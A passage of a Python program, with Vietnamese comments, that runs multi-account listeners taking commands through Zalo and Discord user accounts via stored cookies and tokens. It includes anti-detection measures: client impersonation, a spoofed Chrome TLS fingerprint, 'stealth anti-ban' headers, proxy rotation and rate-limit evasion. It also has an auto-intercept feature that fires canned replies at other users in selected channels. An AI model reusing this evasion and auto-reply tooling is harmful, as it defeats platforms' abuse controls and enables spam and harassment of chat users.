                        rc = rc.get("title") or rc.get("text") or rc.get("msg") or ""
                    ct = strip_invisible_chars(str(rc))
                    is_recent_tail = (idx_m >= max(0, len(msgs) - 2))
                    msg_ts = int(m.get("ts") or 0)
                    if 0 < msg_ts < 10000000000:
                        msg_ts *= 1000
                    is_fresh_cmd = (idx_m == len(msgs) - 1) and is_direct_user_command_text(ct) and (
                        msg_ts == 0 or abs(now_ms - msg_ts) <= 900000
                    )
                    if is_fresh_cmd:
                        m_copy = dict(m)
                        m_copy["grid"] = gid_clean
                        self._process_msg_item(client, acc_now, m_copy, default_is_group=True, fallback_thread_id=gid_clean)
                    else:
                        self._check_and_mark_seen(m, ct, mark=True)
            else:
                self.seeded_groups.add(gid_clean)
                for m in msgs[-6:]:
                    if not isinstance(m, dict):
                        continue
                    rc = m.get("content") or m.get("message") or m.get("msg") or ""
                    if isinstance(rc, dict):
                        rc = rc.get("title") or rc.get("text") or rc.get("msg") or ""
                    ct = strip_invisible_chars(str(rc))
                    if not ct or self._check_and_mark_seen(m, ct, mark=False):
                        continue
                    m_copy = dict(m)
                    m_copy["grid"] = gid_clean
                    self._process_msg_item(client, acc_now, m_copy, default_is_group=True, fallback_thread_id=gid_clean)
        except Exception:
            pass

    def _poll_active_groups_inline(self, client, acc_now):
        """Bộ đồng bộ Đa Tầng Siêu Nhạy cho MỌI Box Zalo:
        1. Quét nhanh preloadconvers/get-last-msgs để bắt lệnh tức thì.
        2. Định kỳ cập nhật danh sách nhóm thực tế từ get_grid_ver_map() (getlg/v4).
        3. Xoay vòng quét trực tiếp get_recent_group_messages(gid) trên TẤT CẢ các nhóm của tài khoản (10 nhóm/nhịp song song)
           để dù gõ lệnh ở bất kỳ Box nào ('box kia') cũng đều ăn lệnh 100% trong < 0.35s và gửi đúng vào Box đó!"""
        now_t = time.time()
        now_ms = int(now_t * 1000)
        my_uid = _clean_zalo_id(client.uid or acc_now.get("uid"))

        try:
            last_conv = client.get_last_msgs()
            u_msgs = last_conv.get("msgs") or []
            g_msgs = last_conv.get("groupMsgs") or []
            preload_tries = getattr(self, "_preload_seed_tries", 0)
            if "__preload_seeded__" not in self.seeded_groups:
                if u_msgs or g_msgs or preload_tries >= 2:
                    self.seeded_groups.add("__preload_seeded__")
                self._preload_seed_tries = preload_tries + 1
                for m in u_msgs:
                    if isinstance(m, dict):
                        rc = m.get("content") or m.get("message") or m.get("msg") or ""
                        if isinstance(rc, dict):
                            rc = rc.get("title") or rc.get("text") or rc.get("msg") or ""
                        ct = strip_invisible_chars(str(rc))
                        msg_ts = int(m.get("ts") or 0)
                        if 0 < msg_ts < 10000000000:
                            msg_ts *= 1000
                        if is_direct_user_command_text(ct) and (msg_ts == 0 or abs(now_ms - msg_ts) <= 900000):
                            _PRIORITY_CMD_EXECUTOR.submit(self._process_msg_item, client, acc_now, dict(m), False, None)
                        else:
                            self._check_and_mark_seen(m, ct, mark=True)
                for m in g_msgs:
                    if isinstance(m, dict):
                        rc = m.get("content") or m.get("message") or m.get("msg") or ""
                        if isinstance(rc, dict):
                            rc = rc.get("title") or rc.get("text") or rc.get("msg") or ""
                        ct = strip_invisible_chars(str(rc))
                        msg_ts = int(m.get("ts") or 0)
                        if 0 < msg_ts < 10000000000:
                            msg_ts *= 1000
                        gid_m = (
                            _clean_zalo_id(m.get("grid"))
                            or _clean_zalo_id(m.get("groupId"))
                            or _clean_zalo_id(m.get("idTo"))
                            or _clean_zalo_id(m.get("toid"))
                        )
                        if (not gid_m or gid_m == my_uid) and _clean_zalo_id(m.get("uidFrom")) in KNOWN_GROUPS_BY_ACC.get(client.uid, set()):
                            gid_m = _clean_zalo_id(m.get("uidFrom"))
                        if gid_m and gid_m != my_uid:
                            KNOWN_GROUPS_BY_ACC[client.uid].add(gid_m)
                            ALL_KNOWN_ZALO_GROUP_IDS.add(gid_m)
                        if gid_m and gid_m != my_uid and is_direct_user_command_text(ct) and (msg_ts == 0 or abs(now_ms - msg_ts) <= 900000):
                            m_copy = dict(m)
                            m_copy["grid"] = gid_m
                            _PRIORITY_CMD_EXECUTOR.submit(self._process_msg_item, client, acc_now, m_copy, True, gid_m)
                        else:
                            self._check_and_mark_seen(m, ct, mark=True)
            else:
                for m in u_msgs:
                    if isinstance(m, dict):
                        rc_u = m.get("content") or m.get("message") or m.get("msg") or ""
                        if isinstance(rc_u, dict):
                            rc_u = rc_u.get("title") or rc_u.get("text") or rc_u.get("msg") or ""
                        ct_u = strip_invisible_chars(str(rc_u))
                        if not ct_u or self._check_and_mark_seen(m, ct_u, mark=False):
                            continue
                        _PRIORITY_CMD_EXECUTOR.submit(self._process_msg_item, client, acc_now, dict(m), False, None)
                for m in g_msgs:
                    if isinstance(m, dict):
                        gid_m = (
                            _clean_zalo_id(m.get("grid"))
                            or _clean_zalo_id(m.get("groupId"))
                            or _clean_zalo_id(m.get("idTo"))
                            or _clean_zalo_id(m.get("toid"))
                        )
                        if not gid_m or gid_m == my_uid:
                            continue
                        KNOWN_GROUPS_BY_ACC[client.uid].add(gid_m)
                        ALL_KNOWN_ZALO_GROUP_IDS.add(gid_m)
                        rc_g = m.get("content") or m.get("message") or m.get("msg") or ""
                        if isinstance(rc_g, dict):
                            rc_g = rc_g.get("title") or rc_g.get("text") or rc_g.get("msg") or ""
                        ct_g = strip_invisible_chars(str(rc_g))
                        if not ct_g or self._check_and_mark_seen(m, ct_g, mark=False):
                            continue
                        m_copy = dict(m)
                        m_copy["grid"] = gid_m
                        def _fast_group_dispatch(msg_item=m_copy, grp_id=gid_m, raw_c=ct_g):
                            c_low = raw_c.strip().lower()
                            needs_full_msg = (
                                ("@" in raw_c and not msg_item.get("mentions") and not msg_item.get("mentionInfo"))
                                or bool(msg_item.get("quote"))
                                or any(c_low.startswith(p) for p in (".sticker", ".nhandan", ".stkr", ".taosticker", ".addfile", ".addnhay", ".addngon", ".undo", ".react", "/sticker", "!sticker"))
                            )
                            if grp_id and is_direct_user_command_text(raw_c) and needs_full_msg:
                                try:
                                    full_g = client.get_recent_group_messages(grp_id)
                                    m_match = next((x for x in reversed(full_g) if str(x.get("msgId")) == str(msg_item.get("msgId"))), None)
                                    if m_match:
                                        msg_item = dict(m_match)
                                        msg_item["grid"] = grp_id
                                except Exception:
                                    pass
                            self._process_msg_item(client, acc_now, msg_item, default_is_group=True, fallback_thread_id=grp_id)
                        _PRIORITY_CMD_EXECUTOR.submit(_fast_group_dispatch)
        except Exception:
            pass

        # Quét thông minh gridVerMap delta (chỉ 1 gói tin nhẹ kiểm tra toàn bộ nhóm xem nhóm nào vừa nhảy version tin nhắn mới)
        # giúp chạy 10-30 Acc Zalo cùng lúc không bao giờ bị Zalo chặn rate-limit hay làm die Cookie/IMEI!
        acc_key = str(client.uid or client.imei or self.acc_id)
        acc_gids = KNOWN_GROUPS_BY_ACC.get(acc_key, set()) | KNOWN_GROUPS_BY_ACC.get(client.uid, set())
        changed_gids = []
        if not hasattr(self, "_grid_ver_cache"):
            self._grid_ver_cache = {}
        if not acc_gids or (now_t - getattr(self, "_last_gmap_check_ts", 0.0) >= 0.45):
            self._last_gmap_check_ts = now_t
            try:
                gmap = client.get_grid_ver_map() or {}
                for gid_k, ver_v in gmap.items():
                    gid_s = _clean_zalo_id(gid_k)
                    if gid_s and gid_s != my_uid:
                        KNOWN_GROUPS_BY_ACC[acc_key].add(gid_s)
                        if client.uid:
                            KNOWN_GROUPS_BY_ACC[client.uid].add(gid_s)
                        ALL_KNOWN_ZALO_GROUP_IDS.add(gid_s)
                        ver_s = str(ver_v)
                        prev_ver = self._grid_ver_cache.get(gid_s)
                        self._grid_ver_cache[gid_s] = ver_s
                        if prev_ver is not None and prev_ver != ver_s:
                            changed_gids.append(gid_s)
            except Exception:
                pass

        for c_gid in changed_gids[:10]:
            _PRIORITY_CMD_EXECUTOR.submit(self._poll_single_group, client, acc_now, c_gid, True)

        if now_t - getattr(self, "_last_rot_group_poll_ts", 0.0) >= 0.14:
            self._last_rot_group_poll_ts = now_t
            own_gids = KNOWN_GROUPS_BY_ACC.get(acc_key, set()) | KNOWN_GROUPS_BY_ACC.get(client.uid, set())
            all_my_gids = sorted(
                g for g in (own_gids if own_gids else ALL_KNOWN_ZALO_GROUP_IDS)
                if _clean_zalo_id(g) and g != my_uid and (client.imei, _clean_zalo_id(g)) not in NON_MEMBER_EXCLUDED_PAIRS
            )
            if all_my_gids:
                batch_gids = []
                for h_gid in list(HOT_ACTIVE_ZALO_GROUPS):
                    if h_gid in all_my_gids and h_gid not in changed_gids and len(batch_gids) < 4:
                        batch_gids.append(h_gid)
                batch_size = min(10, len(all_my_gids))
                for _ in range(len(all_my_gids)):
                    if len(batch_gids) >= batch_size:
                        break
                    cand_g = all_my_gids[self.poll_cursor % len(all_my_gids)]
                    self.poll_cursor += 1
                    if cand_g not in batch_gids and cand_g not in changed_gids:
                        batch_gids.append(cand_g)
                for gid_target in batch_gids:
                    _SHARED_ZALO_POLLER_POOL.submit(self._poll_single_group, client, acc_now, gid_target)

    def _run_http_poller_loop(self):
        stagger_init = (int(self.acc_id or 1) % 7) * 0.06
        if stagger_init > 0:
            self.stop_ev.wait(stagger_init)
        while not self.stop_ev.is_set():
            acc_row = self._get_acc_row()
            if not acc_row or (acc_row.get("platform") or "zalo") != "zalo":
                break
            if not acc_row.get("chat_cmd_enabled", 1):
                self.stop_ev.wait(3.0)
                continue
            try:
                client = Zalo.get_pooled_client(
                    acc_row["imei"], acc_row["cookies"],
                    user_agent=acc_row.get("user_agent") or "",
                    zpw_enk_hint=acc_row.get("zpw_enk") or "",
                    uid_hint=acc_row.get("uid") or ""
                )
                if client.uid:
                    OWNER_UIDS_CACHE.add(str(client.uid))
                now_ka = time.time()
                try:
                    from zalo_login import ZaloPCSessionKeeper
                    ZaloPCSessionKeeper.notify_external_ws_alive(client.uid, client.imei)
                except Exception:
                    pass
                if now_ka - getattr(self, "_last_pc_keepalive_ts", 0.0) > 120.0:
                    self._last_pc_keepalive_ts = now_ka
                    try:
                        srv_sign = hashlib.md5(f"zsecuregetserverinfo645Web{client.imei}30".encode("utf-8")).hexdigest()
                        r_ka = client.s.get(
                            "https://wpa.chat.zalo.me/api/login/getServerInfo",
                            params={"imei": client.imei, "type": 30, "client_version": 645, "computer_name": "Web", "signkey": srv_sign},
                            timeout=4.0
                        )
                        for c_item in r_ka.cookies:
                            if c_item.name and c_item.value:
                                client.cookies_dict[c_item.name] = c_item.value
                    except Exception:
                        pass
                self._poll_active_groups_inline(client, acc_row)
                if "Cần cập nhật" in self.ws_status or "Đang" in self.ws_status or time.time() < self.ws_conflict_until:
                    self.ws_status = "Đang hoạt động trong Acc (Sẵn sàng 24/7)"
            except Exception as e:
                if "Phiên đăng nhập" in str(e) or "zpw_enk" in str(e):
                    self.ws_status = "Cần cập nhật lại Cookie Zalo"
            active_z_cnt = max(1, len(ACTIVE_LISTENERS))
            poll_sleep = 0.12 + min(0.20, max(0, active_z_cnt - 1) * 0.025)
            self.stop_ev.wait(poll_sleep)

    def _run_ws_session(self, client, acc_row, ws_url):
        parsed = urlparse(ws_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "wss" else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        raw_sock = socket.create_connection((host, port), timeout=12)
        if parsed.scheme == "wss":
            ctx = ssl.create_default_context()
            sock = ctx.wrap_socket(raw_sock, server_hostname=host)
        else:
            sock = raw_sock

        ws_key = base64.b64encode(os.urandom(16)).decode()
        cookie_str = "; ".join(f"{k}={v}" for k, v in client.cookies_dict.items())
        handshake = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Origin: https://chat.zalo.me\r\n"
            f"User-Agent: {client.s.headers.get('User-Agent')}\r\n"
            f"Cookie: {cookie_str}\r\n\r\n"
        )
        sock.sendall(handshake.encode("utf-8"))

        resp_buf = bytearray()
        while not resp_buf.endswith(b"\r\n\r\n"):
            b1 = sock.recv(1)
            if not b1:
                sock.close()
                return
            resp_buf.extend(b1)
            if len(resp_buf) > 8192:
                sock.close()
                return

        if b"101" not in resp_buf.split(b"\r\n")[0]:
            sock.close()
            return

        self.ws_status = "Zalo Hybrid Shield Active (.menu Sẵn Sàng)"
        sock.settimeout(2.2)
        last_ping = time.time()

        try:
            while not self.stop_ev.is_set():
                acc_now = self._get_acc_row()
                if not acc_now or not acc_now.get("chat_cmd_enabled", 1):
                    self.ws_status = "Đã tắt nhận lệnh"
                    break

                now_t = time.time()
                if now_t - last_ping >= 18.0:
                    hb_payload = struct.pack("<BHB", 1, 2, 1) + json.dumps({"eventId": int(now_t * 1000)}).encode("utf-8")
                    self._send_ws_frame(sock, hb_payload, opcode=0x2)
                    last_ping = now_t
                    try:
                        from zalo_login import ZaloPCSessionKeeper
                        ZaloPCSessionKeeper.notify_external_ws_alive(client.uid, client.imei)
                    except Exception:
                        pass

                try:
                    opcode, data = self._recv_full_ws_message(sock)
                    if opcode is None or opcode == 0x8:
                        break

                    if opcode in (0x1, 0x2) and data and len(data) >= 4:
                        cmd_id = 0
                        json_part = data
                        if data[0] != ord("{"):
                            cmd_id = struct.unpack("<H", data[1:3])[0]
                            json_part = data[4:]

                        txt_frame = json_part.decode("utf-8", errors="ignore").strip()
                        if not txt_frame.startswith("{"):
                            continue
                        try:
                            outer = json.loads(txt_frame)
                        except Exception:
                            continue

                        if outer.get("key"):
                            self.ws_cipher_key = outer["key"]
                        elif isinstance(outer.get("data"), dict) and outer["data"].get("key"):
                            self.ws_cipher_key = outer["data"]["key"]

                        if cmd_id == 3000:
                            # Người dùng đang mở Zalo Web trên trình duyệt -> nhường WebSocket 35s, dùng HTTP Poller!
                            self.ws_conflict_until = time.time() + 35.0
                            self.ws_status = "Zalo Smart Poller Active (.menu Sẵn Sàng)"
                            break

                        enc_type = int(outer.get("encrypt", 0))
                        raw_d = outer.get("data")
                        if not raw_d:
                            continue

                        inner = self._decode_ws_payload(client, raw_d, enc_type)
                        if inner is not None:
                            if isinstance(inner, dict):
                                k_dec = inner.get("key") or (
                                    inner.get("data", {}).get("key") if isinstance(inner.get("data"), dict) else None
                                )
                                if k_dec and isinstance(k_dec, str):
                                    self.ws_cipher_key = k_dec
                                    self.ws_status = "Zalo Quantum Key Locked (.menu Sẵn Sàng)"

                            self.last_event_ts = time.time()
                            is_grp_cmd = (cmd_id in (521, 522))
                            msg_items = self._extract_msg_dicts(inner, parent_is_group=is_grp_cmd)
                            for m in msg_items:
                                m["cmd"] = cmd_id
                                _PRIORITY_CMD_EXECUTOR.submit(self._process_msg_item, client, acc_now, m, is_grp_cmd, None)
                except socket.timeout:
                    continue
                except Exception:
                    break
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _handle_shared_ws_frame(self, client, acc_now, opcode, data):
        """Nhận trực tiếp gói tin từ kết nối WebSocket duy nhất của ZaloPCSessionKeeper (Không bao giờ mở WebSocket thứ 2 gây xung đột cmd_id=3000!)."""
        try:
            if opcode in (0x1, 0x2) and data and len(data) >= 4:
                cmd_id = 0
                json_part = data
                if data[0] != ord("{"):
                    cmd_id = struct.unpack("<H", data[1:3])[0]
                    json_part = data[4:]
                txt_frame = json_part.decode("utf-8", errors="ignore").strip()
                if not txt_frame.startswith("{"):
                    return
                outer = json.loads(txt_frame)
                if outer.get("key"):
                    self.ws_cipher_key = outer["key"]
                elif isinstance(outer.get("data"), dict) and outer["data"].get("key"):
                    self.ws_cipher_key = outer["data"]["key"]
                enc_type = int(outer.get("encrypt", 0))
                raw_d = outer.get("data")
                if not raw_d:
                    return
                inner = self._decode_ws_payload(client, raw_d, enc_type)
                if inner is not None:
                    if isinstance(inner, dict):
                        k_dec = inner.get("key") or (
                            inner.get("data", {}).get("key") if isinstance(inner.get("data"), dict) else None
                        )
                        if k_dec and isinstance(k_dec, str):
                            self.ws_cipher_key = k_dec
                    self.last_event_ts = time.time()
                    is_grp_cmd = (cmd_id in (521, 522))
                    msg_items = self._extract_msg_dicts(inner, parent_is_group=is_grp_cmd)
                    for m in msg_items:
                        m["cmd"] = cmd_id
                        _PRIORITY_CMD_EXECUTOR.submit(self._process_msg_item, client, acc_now, m, is_grp_cmd, None)
        except Exception:
            pass

    def _run_loop(self):
        while not self.stop_ev.is_set():
            acc_row = self._get_acc_row()
            if not acc_row or (acc_row.get("platform") or "zalo") != "zalo":
                break
            if not acc_row.get("chat_cmd_enabled", 1):
                self.ws_status = "Đã tắt nhận lệnh"
                self.stop_ev.wait(4.0)
                continue

            try:
                client = Zalo.get_pooled_client(
                    acc_row["imei"], acc_row["cookies"],
                    user_agent=acc_row.get("user_agent") or "",
                    zpw_enk_hint=acc_row.get("zpw_enk") or "",
                    uid_hint=acc_row.get("uid") or ""
                )
                if client.uid and not acc_row.get("uid"):
                    try:
                        conn = db()
                        conn.execute("UPDATE accounts SET uid=? WHERE id=?", (client.uid, self.acc_id))
                        conn.commit()
                        conn.close()
                    except Exception:
                        pass

                from zalo_login import ZaloPCSessionKeeper
                ZaloPCSessionKeeper.register_ws_frame_callback(
                    client.imei,
                    lambda op, dt, c=client: self._handle_shared_ws_frame(c, self._get_acc_row() or acc_row, op, dt),
                    listener_id=f"acc_{self.acc_id}"
                )
                kp = ZaloPCSessionKeeper.register_and_keep_alive(
                    uid=client.uid or "",
                    imei=client.imei,
                    cookies_dict=client.cookies_dict,
                    zpw_enk=client.secret_key or "",
                    user_agent=client.user_agent or "",
                    pc_name=acc_row.get("pc_name") or "Windows 11 Pro (Singapore)",
                    display_name=acc_row.get("name") or client.display_name or "",
                    ws_urls=client.ws_urls,
                    db_path=DB_PATH,
                    wait_ws_sec=2.0,
                )
                if kp is not None or ZaloPCSessionKeeper.has_active_keeper(client.imei):
                    # Tuyệt đối chỉ sử dụng 1 kết nối WebSocket duy nhất từ ZaloPCSessionKeeper cho mỗi IMEI
                    # để không bao giờ gây xung đột cmd_id=3000 khi chạy nhiều Acc cùng lúc!
                    self.ws_status = "Đang sống trong Acc (Single WS + Poller 24/7)"
                    self.stop_ev.wait(6.0)
                else:
                    ws_list = list(client.ws_urls or ["wss://ws1.chat.zalo.me", "wss://ws2.chat.zalo.me"])
                    for w_url in ws_list:
                        if self.stop_ev.is_set() or time.time() < self.ws_conflict_until:
                            break
                        try:
                            self._run_ws_session(client, acc_row, w_url)
                        except Exception:
                            continue
                    self.stop_ev.wait(3.0)
            except Exception:
                self.ws_status = "Zalo Poller Đang Bảo Vệ..."
                self.stop_ev.wait(5.0)

# LISTENER 24/7 TRÊN DISCORD ACC CHÍNH CHỦ & BOT (CHROME 131 TLS GATEWAY + ZERO-SCRAPE SHIELD)
class DiscordRealtimeListener:
    def __init__(self, acc_id):
        self.acc_id = acc_id
        self.platform = "discord"
        self.stop_ev = threading.Event()
        self.seen_msg_ids = deque(maxlen=2500)
        self.seeded_channels = set()
        self.ws_status = "Đang khởi tạo NHK Discord Shield..."
        self.last_event_ts = 0.0
        self.last_seq = None
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.poller_thread = threading.Thread(target=self._run_discord_http_poller_loop, daemon=True)

    def start(self):
        self.thread.start()
        self.poller_thread.start()

    def stop(self):
        self.stop_ev.set()

    def _get_acc_row(self):
        return get_account_from_ram(self.acc_id)

    def _handle_discord_message_event(self, client, acc_row, msg_data):
        if not isinstance(msg_data, dict):
            return
        msg_id = str(msg_data.get("id") or "")
        content = str(msg_data.get("content") or "")
        if not content:
            return

        if is_system_echo_message(msg_id=msg_id, text=content):
            return

        if msg_id in self.seen_msg_ids:
            return
        if msg_id:
            self.seen_msg_ids.append(msg_id)

        channel_id = str(msg_data.get("channel_id") or "")
        guild_id = str(msg_data.get("guild_id") or "")
        if channel_id and guild_id:
            DiscordStealthAntiBanEngine.register_channel_guild(channel_id, guild_id)

        author = msg_data.get("author") or {}
        sender_id = str(author.get("id") or "")
        sender_name = author.get("global_name") or author.get("username") or ""
        if sender_id and sender_name:
            GLOBAL_USER_NAME_CACHE[sender_id] = sender_name

        if not channel_id:
            return

        DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS[self.acc_id].add(str(channel_id))

        clean_check = strip_invisible_chars(content)
        custom_pfx = (acc_row.get("cmd_prefix") or ".").strip()
        if not clean_check.startswith(tuple(set([custom_pfx, ".", "/", "!"]))):
            if str(channel_id) in AUTO_INTERCEPT_BOXES and sender_id and sender_id != str(client.user_id or "") and sender_id not in OWNER_UIDS_CACHE:
                ic_cfg = AUTO_INTERCEPT_BOXES.get(str(channel_id))
                if ic_cfg and ic_cfg.get("enabled"):
                    b_list = ic_cfg.get("blocks") or ["Phản đòn siêu tốc 0s!"]
                    idx_c = ic_cfg.get("idx", 0)
                    ic_cfg["idx"] = idx_c + 1
                    reply_line = b_list[idx_c % len(b_list)]
                    target_m = [{"uid": sender_id, "id": sender_id, "name": sender_name or f"User_{sender_id[-4:]}"}]
                    _PRIORITY_CMD_EXECUTOR.submit(
                        client.send_message,
                        channel_id, reply_line, "rainbow", None, True,
                        target_m, False, False, True, None, None, None, True
                    )
            return

        raw_mentions = []
        for m in (msg_data.get("mentions") or []):
            muid = str(m.get("id") or "")
            mname = m.get("global_name") or m.get("username") or ""
            if muid:
                if mname:
                    GLOBAL_USER_NAME_CACHE[muid] = mname
                raw_mentions.append({"uid": muid, "id": muid, "name": mname})

        reply_target = None
        ref_msg = msg_data.get("referenced_message")
        if isinstance(ref_msg, dict):
            ref_auth = ref_msg.get("author") or {}
            r_uid = str(ref_auth.get("id") or "").strip()
            r_name = str(ref_auth.get("global_name") or ref_auth.get("username") or "").strip()
            if r_uid:
                if r_name:
                    GLOBAL_USER_NAME_CACHE[r_uid] = r_name
                reply_target = {"uid": r_uid, "name": r_name or f"User_{r_uid[-4:]}"}

        def _instant_cmd_exec():
            if self.stop_ev.is_set():
                return
            DiscordStealthAntiBanEngine.ensure_session_warmed_up(client.token, is_bot=client.is_bot)
            parse_and_execute_inchat_command(
                zalo_client=None,
                acc_row=acc_row,
                thread_id=channel_id,
                is_group=True,
                sender_id=sender_id,
                raw_msg=content,
                raw_mentions=raw_mentions,
                discord_client=client,
                platform="discord",
                pre_claimed_slot=False,
                sender_name=sender_name,
                msg_id=msg_id,
                reply_target=reply_target
            )

        _PRIORITY_CMD_EXECUTOR.submit(_instant_cmd_exec)

    def _poll_active_discord_channels_fallback(self, client, acc_now):
        ch_set = list(DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS.get(self.acc_id, set()))[:5]
        if not ch_set:
            return
        prio_sess = DiscordStealthAntiBanEngine.get_priority_session(client.token, is_bot=client.is_bot)
        req_hdrs = DiscordStealthAntiBanEngine.build_stealth_headers(client.token, is_bot=client.is_bot)
        for cid in ch_set:
            if self.stop_ev.is_set():
                break
            try:
                ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(client.token, f"/channels/{cid}/messages?limit=3", 0)
                r = ProxyPoolEngine.request_with_fast_failover(
                    prio_sess, "GET", ep, seed_key=f"poll_{client.token[:10]}_{cid}",
                    priority_bypass=True, headers=req_hdrs, timeout=(0.8, 1.6)
                )
                if r.status_code == 200 and isinstance(r.json(), list):
                    msgs = list(reversed(r.json()))
                    if cid not in self.seeded_channels:
                        self.seeded_channels.add(cid)
                        now_ms = int(time.time() * 1000)
                        for idx_m, m in enumerate(msgs):
                            if not isinstance(m, dict):
                                continue
                            ct = strip_invisible_chars(str(m.get("content") or ""))
                            if idx_m == len(msgs) - 1 and is_direct_user_command_text(ct):
                                m["channel_id"] = cid
                                self._handle_discord_message_event(client, acc_now, m)
                            elif m.get("id"):
                                self.seen_msg_ids.append(str(m["id"]))
                    else:
                        for m in msgs:
                            if isinstance(m, dict):
                                m["channel_id"] = cid
                                self._handle_discord_message_event(client, acc_now, m)
            except Exception:
                continue

    def _run_discord_http_poller_loop(self):
        self.stop_ev.wait(0.8)
        while not self.stop_ev.is_set():
            acc_row = self._get_acc_row()
            if not acc_row or acc_row.get("platform") != "discord":
                break
            if not acc_row.get("chat_cmd_enabled", 1):
                self.stop_ev.wait(2.5)
                continue
            try:
                client = DiscordClient(acc_row["token"], is_bot=bool(acc_row.get("is_bot", 0)))
                self._poll_active_discord_channels_fallback(client, acc_row)
            except Exception:
                pass
            self.stop_ev.wait(0.15)

    def _run_gateway_session(self, client, acc_row):
        resume_state = DiscordStealthAntiBanEngine.get_gateway_resume_state(client.token)
        host = "gateway.discord.gg"
        if resume_state and resume_state.get("resume_url"):
            try:
                p_url = urlparse(resume_state["resume_url"])
                if p_url.hostname:
                    host = p_url.hostname
            except Exception:
                host = "gateway.discord.gg"
        port = 443
        path = "/?encoding=json&v=9"

        raw_sock = socket.create_connection((host, port), timeout=10)
        ctx = DiscordStealthAntiBanEngine.create_chrome_tls_context()
        sock = ctx.wrap_socket(raw_sock, server_hostname=host)

        ws_key = base64.b64encode(os.urandom(16)).decode()
        handshake = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: Upgrade\r\n"
            f"Pragma: no-cache\r\n"
            f"Cache-Control: no-cache\r\n"
            f"User-Agent: {client.s.headers.get('User-Agent')}\r\n"
            f"Upgrade: websocket\r\n"
            f"Origin: https://discord.com\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n\r\n"
        )
        sock.sendall(handshake.encode("utf-8"))

        resp_buf = bytearray()
        while not resp_buf.endswith(b"\r\n\r\n"):
            b1 = sock.recv(1)
            if not b1:
                sock.close()
                return
            resp_buf.extend(b1)
            if len(resp_buf) > 8192:
                sock.close()
                return

        if b"101" not in resp_buf.split(b"\r\n")[0]:
            sock.close()
            return

        sock.settimeout(2.2)
        hb_interval = 38.0
        last_hb = time.time()
        identified = False
        zlib_inflator = zlib.decompressobj()
        zlib_buf = bytearray()

        try:
            while not self.stop_ev.is_set():
                acc_now = self._get_acc_row()
                if not acc_now or not acc_now.get("chat_cmd_enabled", 1):
                    self.ws_status = "Đã tắt nhận lệnh"
                    break

                now_t = time.time()
                if identified and (now_t - last_hb >= hb_interval):
                    hb_pkt = json.dumps({"op": 1, "d": self.last_seq}).encode("utf-8")
                    ZaloRealtimeListener._send_ws_frame(sock, hb_pkt, opcode=0x1)
                    last_hb = now_t

                try:
                    opcode, data = ZaloRealtimeListener._recv_full_ws_message(sock)
                    if opcode is None or opcode == 0x8:
                        break

                    raw_json_str = None
                    if opcode == 0x2 and data:
                        zlib_buf.extend(data)
                        if len(zlib_buf) >= 4 and zlib_buf[-4:] == b"\x00\x00\xff\xff":
                            try:
                                raw_json_str = zlib_inflator.decompress(bytes(zlib_buf)).decode("utf-8", errors="ignore")
                            except Exception:
                                raw_json_str = None
                            zlib_buf.clear()
                    elif opcode == 0x1 and data:
                        raw_json_str = data.decode("utf-8", errors="ignore")

                    if raw_json_str:
                        try:
                            pkt = json.loads(raw_json_str)
                        except Exception:
                            continue

                        op = pkt.get("op")
                        seq = pkt.get("s")
                        if seq is not None:
                            self.last_seq = seq
                        t_ev = pkt.get("t")
                        d_ev = pkt.get("d")

                        if op == 10 and isinstance(d_ev, dict):
                            hb_interval = max(20.0, (float(d_ev.get("heartbeat_interval", 41250)) / 1000.0) * 0.90)
                            cur_resume = DiscordStealthAntiBanEngine.get_gateway_resume_state(client.token)
                            if not client.is_bot and cur_resume and cur_resume.get("session_id"):
                                resume_payload = {
                                    "op": 6,
                                    "d": {
                                        "token": client.token,
                                        "session_id": cur_resume["session_id"],
                                        "seq": self.last_seq or cur_resume.get("last_seq", 0),
                                    }
                                }
                                ZaloRealtimeListener._send_ws_frame(sock, json.dumps(resume_payload).encode("utf-8"), opcode=0x1)
                                identified = True
                                last_hb = time.time()
                                self.ws_status = "NHK Discord Shield (Resumed - 0ms)"
                            elif client.is_bot:
                                ident_payload = {
                                    "op": 2,
                                    "d": {
                                        "token": client.token,
                                        "intents": 37377,
                                        "properties": {"os": "linux", "browser": "discord_client", "device": "discord_client"}
                                    }
                                }
                                ZaloRealtimeListener._send_ws_frame(sock, json.dumps(ident_payload).encode("utf-8"), opcode=0x1)
                                identified = True
                                last_hb = time.time()
                                self.ws_status = "NHK Discord Bot Shield (0ms)"
                            else:
                                ident_payload = {
                                    "op": 2,
                                    "d": {
                                        "token": client.token,
                                        "capabilities": 30717,
                                        "properties": DiscordStealthAntiBanEngine.build_super_properties_dict(client.token),
                                        "presence": {"status": "online", "since": 0, "activities": [], "afk": False},
                                        "client_state": {
                                            "guild_versions": {},
                                            "private_channels_version": "0",
                                            "read_state_version": 0,
                                            "user_guild_settings_version": -1,
                                            "user_settings_version": -1
                                        }
                                    }
                                }
                                ZaloRealtimeListener._send_ws_frame(sock, json.dumps(ident_payload).encode("utf-8"), opcode=0x1)
                                identified = True
                                last_hb = time.time()
                                self.ws_status = "NHK Discord Shield (0ms Sẵn Sàng)"

                        elif op == 0 and t_ev == "READY" and isinstance(d_ev, dict):
                            sess_id = str(d_ev.get("session_id") or "")
                            res_url = str(d_ev.get("resume_gateway_url") or "wss://gateway.discord.gg")
                            u_obj = d_ev.get("user") or {}
                            if isinstance(u_obj, dict) and u_obj.get("id"):
                                DiscordStealthAntiBanEngine.set_cached_me(client.token, u_obj)
                                client.user_id = str(u_obj["id"])
                                OWNER_UIDS_CACHE.add(client.user_id)
                            DiscordStealthAntiBanEngine.harvest_ready_payload(client.token, d_ev)
                            if sess_id:
